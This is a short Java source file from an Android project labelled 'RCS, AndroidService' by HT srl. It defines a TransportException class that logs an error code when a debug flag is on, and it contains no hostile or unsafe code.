/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : TransportException.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action.sync;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class TransportException.
 */
public class TransportException extends Exception {

	/** The debug. */
	private static final String TAG = "TransportEx"; //$NON-NLS-1$

	/**
	 * Instantiates a new transport exception.
	 * 
	 * @param i
	 *            the i
	 */
	public TransportException(final int i) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " TransportException: " + i);//$NON-NLS-1$
		}
	}
}
